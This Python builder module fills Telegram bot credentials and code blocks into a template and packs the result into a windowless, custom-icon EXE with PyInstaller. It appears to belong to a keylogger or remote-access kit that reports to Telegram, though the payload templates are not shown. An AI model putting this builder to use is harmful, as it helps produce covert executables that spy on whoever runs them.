# import libraries
from colorama import init, Fore
from subprocess import getoutput
from modules import banner
from time import sleep

# setup the  colorama library
init()

def printer(per="0"): # it print same banner each time and print the percent of executing
    # clear terminal
    banner.clear()
    # print same banner each time
    banner.same_banner()
    # print percent of executing(we get it from input)
    print(Fore.GREEN + f"Creating EXE file({per}%).")
    # wait for 1 second
    sleep(1)
def make_python(ID, TOKEN, NAME, MAX_LETTER, CODE_ADDR, OFFLINE_CODE_ADDR, PLATFORM): # create the python file
    # read platform code(builder/windows-build.py or linux-build.py)
    with open(PLATFORM, "r") as read: 
        text = read.readlines()
        # read online code file 
        try:
            with open(CODE_ADDR, "r") as read:
                reader = read.readlines()
                reader = "".join(reader)
                reader = reader.split("\n")
                online_code = """"""
                # read each line of code
                for line in reader:
                    online_code += f"    {line}\n"
        except FileNotFoundError: print(Fore.RED + f"Couldn't find {CODE_ADDR}")
        # read offline code file
        try:
            with open(OFFLINE_CODE_ADDR, "r") as read:
                reader = read.readlines()
                reader = "".join(reader)
                reader = reader.split("\n")
                offline_code = """"""
                # read each line of code
                for line in reader:
                    offline_code += f"    {line}\n"
        except FileNotFoundError: print(Fore.RED + f"Couldn't find {OFFLINE_CODE_ADDR}")
        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("ONLINE_CODE", online_code).replace("OFFLINE_CODE", offline_code).replace("MAX_LETTER", f"int({MAX_LETTER})")
    # make 'output' directory
    getoutput("mkdir output")
    # make output file with custom name
    with open(f"output/{NAME}.py", "w") as write:
        # write all of code in file
        write.write(text)
    # print log
    print(Fore.GREEN + "File is created in /output directory.")
def make_exe(NAME, ICON): 
    # print 0%
    printer("0")
    # make 'exe' directory in 'output' directory
    getoutput("mkdir output/exe")
    # print 15%
    printer("15")
    # start creating the exe file with pyinstaller
    if "not recognized" in getoutput("pyinstaller"): command = f"python -m PyInstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py"
    else: command = f"python -m pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py"
    out = getoutput(command)
    # print 50%
    printer("50")
    # make exe output log file in log/ directory
    with open("log/pyinstaller-out.txt", "w") as file:
        # write output
        file.write(out)
        # print 80%
        printer("80")
    # print 100%
    printer("100")
    # print final log
    print(Fore.GREEN + f"\n\n.exe application is created in /output/exe/{NAME}.exe\n{Fore.YELLOW} If not check log/pyinstaller-out.txt")